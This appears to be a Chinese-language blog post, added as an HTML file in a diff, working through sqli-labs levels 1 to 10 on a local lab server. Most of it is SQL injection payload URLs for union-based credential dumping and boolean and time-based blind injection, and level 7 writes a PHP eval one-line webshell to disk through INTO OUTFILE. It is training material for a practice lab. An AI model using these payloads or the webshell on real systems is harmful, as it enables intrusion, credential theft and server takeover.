@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[学习链接]：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av66072415 MySQL简单基本用法 12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        vers">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs (1-10)">
+<meta property="og:url" content="http://example.com/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/index.html">
+<meta property="og:site_name" content="lemon&#39;s Blog">
+<meta property="og:description" content="[学习链接]：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av66072415 MySQL简单基本用法 12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        vers">
+<meta property="og:locale">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020012418114762.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200127195420602.png">
+<meta property="article:published_time" content="2020-01-23T12:21:05.000Z">
+<meta property="article:modified_time" content="2020-05-05T03:43:15.791Z">
+<meta property="article:author" content="lemonl">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2020012418114762.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2020/01/23/SQL注入之sqli-labs/"/>
+
+
+
+
+
+  <title>sqli-labs (1-10) | lemon's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lemon's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Normally Insane</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lemon's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs (1-10)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-23T20:21:05+08:00">
+                2020-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%9E%E6%88%98/" itemprop="url" rel="index">
+                    <span itemprop="name">实战</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  13
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>[学习链接]：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av66072415">https://www.bilibili.com/video/av66072415</a></p>
+<p><font color='blue' size=4>MySQL简单基本用法</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用的几个函数：</span><br><span class="line">        system_user() —— 系统用户</span><br><span class="line">        user() —— 普通用户</span><br><span class="line">        current_user() —— 当前用户</span><br><span class="line">        database() —— 当前所用的数据库</span><br><span class="line">        version() —— 数据库的版本</span><br><span class="line">        @@datadir —— 安装路径</span><br><span class="line">        @@version_compile_os —— 本机系统</span><br></pre></td></tr></table></figure>
+
+<p>假定：数据库名-security，表名-users</p>
+<ul>
+<li><p>查库：select schema_name from information_schema.schemata</p>
+</li>
+<li><p>查表：select table_name from information_schema.tables where table_schema=’security’</p>
+</li>
+<li><p>查列：select column_name from information_schema.columns where table_name=’users’</p>
+</li>
+<li><p>查字段： select username,password from security.users</p>
+</li>
+</ul>
+<h4 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h4><p>构造payload: <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-1/?id=1">http://127.0.0.1/sqli/Less-1/?id=1</a></p>
+<p>得到 name:Dumb, password:Dumb</p>
+<p>—— 当然，可以改变后面id的值，会得到不同的name和password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1. # 其中limit后面的第一位(0)表示从第几个开始，第二位表示显示多少个数据(1)</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">    得到的SQL语句为：select * from users where id=&#x27;1&#x27; limit 0,1 </span><br><span class="line">    </span><br><span class="line">2. # A and B —— 当A和B都为1时，结果为true; A or B —— A、B任何一个为1，结果都为true</span><br><span class="line">   # --+  # -- 都表示注释符</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&#x27; or 1=1--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; or 1=1-- &#x27; LIMIT 0,1</span><br><span class="line">    </span><br><span class="line">3. # orber by 表示对表中的某个字段进行排序</span><br><span class="line">   # 通过order by 语句可以确定数据列数，本题包含id在内有3个字段</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 1--+</span><br><span class="line">    得到sql语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; order by 1-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">4. # 联合查询union的作用是将两个select查询结果和并</span><br><span class="line">   # 通过将id改为-1，判断显示的内容在数据库的第几列</span><br><span class="line">   # 得到login name在第2列，Password在第3列</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,3--+</span><br><span class="line">   得到sql语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">5. # 选3的位置作为回显位置，获取username或者password</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata limit 0,1--+</span><br><span class="line">   得到SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,schema_name from information_schema.schemata LIMIT 0,1-- &#x27; LIMIT 0,1</span><br><span class="line">   </span><br><span class="line">6. # group_concat(),可以将所有的数据拼接在一行显示  		    </span><br><span class="line">   # 详情見本链接 https://www.yiibai.com/mysql/group_concat.html</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 0,1-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">7. # 得到表信息, emails,referers,uagents,users</span><br><span class="line">   # 但是后面的security两边的引号较为危险，推荐将其改为十六进制的形式</span><br><span class="line">   # 即为：table_schema=0x7365637572697479</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">8. # 得到列信息：id,username,password</span><br><span class="line">   # 16进制为：0x7573657273</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">9. # 得到password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(password) from security.users--+</span><br><span class="line">    得到SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(password) from security.users-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">10. # concat_ws()函数能将username和password同时取出，用‘-’连接</span><br><span class="line">    # 推荐将连接符号‘-’转换为16进制，0x2D</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,username,password)) from security.users--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,username,password)) from security.users-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>步骤总结：</p>
+<ol>
+<li><p><font color='red'>查看是否有注入</font></p>
+</li>
+<li><p><font color='red'>查看有多少列</font></p>
+</li>
+<li><p><font color='red'>查看哪些数据可以回显</font></p>
+</li>
+<li><p><font color='red'>查看当前数据库</font></p>
+</li>
+<li><p><font color='red'>查看所有的数据库</font></p>
+</li>
+<li><p><font color='red'>查看所有的表</font></p>
+</li>
+<li><p><font color='red'>查看所有的字段</font></p>
+</li>
+<li><p><font color='red'>得到所有的账号和密码</font></p>
+<div align='center'><img width='500' hight='300' src='https://img-blog.csdnimg.cn/2020012418114762.png'></div></li>
+</ol>
+<h4 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h4><p>​    id=1’时报错，则存在sql注入，此时发现引号是多余的。</p>
+<p>​    模版为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-2/?id=-1%EF%BC%88%E6%AD%A4%E4%B8%BA%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%EF%BC%89--+">http://127.0.0.1/sqli/Less-2/?id=-1（此为要构造的）--+</a></p>
+<p>​    按照步骤得到正确答案。</p>
+<h4 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h4><p>​    id=1’时报错，存在sql注入，此时发现引号、右括号是多余的</p>
+<p>​    模板为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-3/?id=1&#39;">http://127.0.0.1/sqli/Less-3/?id=1&#39;</a>) (此为要构造的) –+</p>
+<p>​    按照步骤得到正确答案</p>
+<h4 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h4><p>​    id=1”时报错，存在sql注入，此时发现引号、右括号是多余的</p>
+<p>​    模板为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-4?id=1&quot;">http://127.0.0.1/sqli/Less-4?id=1&quot;</a>) (此为要构造的) –+ </p>
+<p>​    按照步骤得到正确答案</p>
+<h4 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h4><p>​    难度正式加大了。</p>
+<p>​    <font color='ligreen'><b>基础知识补充：</b></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. left()函数 —— left(a,b)从左侧截取a的前b位，正确返回1，错误返回0</span><br><span class="line">    例：select left(database(),1)=&#x27;s&#x27;; —— 前1位是否为s</span><br><span class="line"></span><br><span class="line">2. regexp函数 —— 正则表达式匹配</span><br><span class="line">    例：select database() regexp &#x27;s&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line"></span><br><span class="line">3. like函数 —— 模糊正则匹配</span><br><span class="line">    例：select database() like &#x27;s%&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line"></span><br><span class="line">4. substr(a,b,c) —— 从位置b开始，截取a字符串c位长度</span><br><span class="line">    例：select substr((select database(),1,1))=&#x27;s&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line">        select substr((select database(),1,3))=&#x27;sec&#x27;; —— 匹配前3个字符是否为sec</span><br><span class="line"></span><br><span class="line">5. ascii() —— 将某个字符串转化为ascii值</span><br><span class="line">    例：select ascii(substr(select database()),1,1); —— 回显115或者：</span><br><span class="line">        select ascii(substr(select database(),1,1))&gt;110 —— 如果大于110，返回1，否则返回0</span><br><span class="line"></span><br><span class="line">6. chr(&#x27;数字&#x27;) 或者 ord(&#x27;字母&#x27;) —— 使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line"></span><br><span class="line">7. length() —— 判断长度</span><br></pre></td></tr></table></figure>
+
+<p>​    当id=1时，显示<font color='purple'><b>  You are in……</b></font>;当id值大于12时，没有任何的显示。这就是典型的<font color='red'>  布尔盲注</font></p>
+<p>​    布尔盲注：一般是在网页没有报错、回显的时候使用。只能对url输入的判断一个对错，一般只能判断一个英文字符。</p>
+<div align='center'><img width=500 height=550 src='https://img-blog.csdnimg.cn/20200127195420602.png'></div>
+
+<p>​    id=1’时报错，存在sql注入。可以知道正确的情况下会显示 <font color='purple'><b>  You are in……</b></font>按照之前的步骤可以判断此为3列，接下来判断数据库名之类的就要用到上面的补充知识了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. # 求当前数据库名的长度</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8--+</span><br><span class="line"></span><br><span class="line">2. # 判断数据库名的第一个字符</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;--+</span><br><span class="line">   # 接下来判断数据库名的其他位</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and left((select database()),2)=&#x27;c&#x27;--+</span><br><span class="line"></span><br><span class="line">   # 手工一个一个排查十分的麻烦，这个时候可以将burpsuit派上用场，直接爆破，或者写脚本完成</span><br><span class="line">   -----------------------------------------------------------------------------------------</span><br><span class="line">   # 或者使用if来进行判断测试,二分法测试，减少了时间</span><br><span class="line">   # 下面的方法select database()会出现bug，因为MySQL里面的数据库为NULL，所以无论后面的数字为多大，永远都显示 You are in ……</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select database()),1,1))&gt;110--+ </span><br><span class="line"></span><br><span class="line">   # 此种方法可以避免bug,limit 1(表示选择第几个数据库),1</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;110--+ </span><br><span class="line">   依次类推，得到所有的数据库</span><br><span class="line">   </span><br><span class="line">3. # 爆security中的表名</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;110--+</span><br><span class="line">   # 判断是否存在表</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select group_concat(table_name) from information_schema.tables where table_schema=‘security’ )–+</span><br><span class="line">    依次类推，得到所有的表</span><br><span class="line"> 	</span><br><span class="line">4. # 爆字段名</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+ </span><br><span class="line">    依次类推，得到users的表username，password的值</span><br><span class="line"></span><br><span class="line">5. # 爆字段内的值</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select username from security.users limit 1,1),1,1))=65--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h4><p>​    id=1” 时报错，存在sql注入</p>
+<p>​    模板为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-3/?id=1&quot;">http://127.0.0.1/sqli/Less-3/?id=1&quot;</a> (此为要构造的) –+</p>
+<p>​    按照第五关步骤得到正确答案</p>
+<h4 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h4><p>​    <font color='ligreen'><b>基础知识补充：</b></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. show variables like &#x27;%secure%&#x27;;查看secure-file-priv当前的值，如果显示为NULL，则需要打开C:\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure-file-priv=&quot;/&quot;</span><br><span class="line">    # 这一步实在解决不了就参考https://blog.csdn.net/qq_31518899/article/details/75662090</span><br><span class="line">    </span><br><span class="line">2. 一句话木马：PHP版本：&lt;?php @eval($_POST[&quot;hacker&quot;]);?&gt; 其中hacker为密码</span><br><span class="line"></span><br><span class="line">3. load_file() 读取本地文件 select load_file(&#x27;C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test1.txt&#x27;);</span><br><span class="line"></span><br><span class="line">4. into outfile 写文件 </span><br><span class="line">   用法：select &#x27;php is the best language&#x27; into outfile &#x27;test1.txt&#x27;;</span><br><span class="line">   文件位置：C:\phpStudy\PHPTutorial\MySQL\data</span><br><span class="line">   —————————————————————————————————————————————————————————————————————————</span><br><span class="line">   或者是：</span><br><span class="line">   用法：select &#x27;crow 666&#x27; into outfile &#x27;C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test1.txt&#x27;;</span><br><span class="line">   文件位置：C:\phpStudy\PHPTutorial\WWW\sqli\Less-7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当 id=1 时，显示  <font color='purple'><b>  You are in…… Use outfile……</b></font>；直接加单引号 id=1’,显示 <font color='purple'><b>  You have an error in your SQL syntax</b></font>, 则存在SQL注入</li>
+<li>注入模版为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-7/?id=1%E2%80%98">http://127.0.0.1/sqli/Less-7/?id=1‘</a>)) (要构造的)–+</li>
+<li>根据提示，会用到outfile函数，可以构造payload: <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-7/?id=1&#39;">http://127.0.0.1/sqli/Less-7/?id=1&#39;</a>)) union select 1,2,’<?php @eval($_POST["hacker"]);?>‘ into outfile ‘C:\phpStudy\PHPTutorial\WWW\sqli\Less-7\test1.php’–+ </li>
+<li>访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-7/test1.php%EF%BC%8C%E6%98%BE%E7%A4%BA">http://127.0.0.1/sqli/Less-7/test1.php，显示</a> <font color='#ffe8b6'> 1    Dumb    Dumb 1    2</font></li>
+<li>写入了一句话木马后，用中国菜刀访问，此时hacker为密码,成功拿到网站的webshell</li>
+</ul>
+<h4 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h4><p>​    id=1’时 <font color='purple'><b>  You are in……</b></font>消失，则存在sql注入。</p>
+<p>​    模版为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-2/?id=1&#39;%EF%BC%88%E6%AD%A4%E4%B8%BA%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%EF%BC%89--+">http://127.0.0.1/sqli/Less-2/?id=1&#39;（此为要构造的）--+</a></p>
+<p>​    按照第5关的步骤得到正确答案。</p>
+<h4 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h4><p><font color='ligreen'><b>基础知识补充：</b></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. if(condition,A,B) —— 如果条件condition为true,则执行语句A，否则执行B</span><br><span class="line">    例： select if(1&gt;2,4,5);返回的结果为5(如果在mysql命令行中使用，首先要use xxx数据库才行)</span><br><span class="line"> </span><br><span class="line">2. sleep() 休眠多长时间</span><br><span class="line"></span><br><span class="line">3. # 使用时间延迟的方法判断是否存在注入漏洞</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and sleep(5)--+ </span><br><span class="line"></span><br><span class="line">4. # 当为8的时候很快加载，为其他值的时候加载较慢（延迟5秒左右），那就说明此时数据库的长度为8(security)</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(length(database())=8,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">5. # 如果当前数据库的第一个字母的ascii值大于113的时候立即返回结果，否则执行5秒</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">6. # 同理哦安短数据库中的第五个数据库的第一位的ascii是否大于112</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(ascii(substr((select schmea_name from information_schema.schemata limit 4,1),1,1))&gt;113,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">7. 其余步骤基本相似，可以采用burpsuit或者是sql盲注的脚本使用 </span><br><span class="line">   了解一下DNSlog</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>​    <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-10/?id=1&quot;">http://127.0.0.1/sqli/Less-10/?id=1&quot;</a> and sleep(5)–+ 只是将less-9中的单引号换成了双引号，其余均相同。</p>
+<p><strong>注意</strong>：一般情况下，测试有六种方法：</p>
+<ul>
+<li>‘  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   单引号</li>
+<li>‘)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    单引号、括号</li>
+<li>‘)) &nbsp;&nbsp;&nbsp;&nbsp;    单引号、双括号</li>
+<li>“   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    双引号</li>
+<li>“)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    双引号、括号</li>
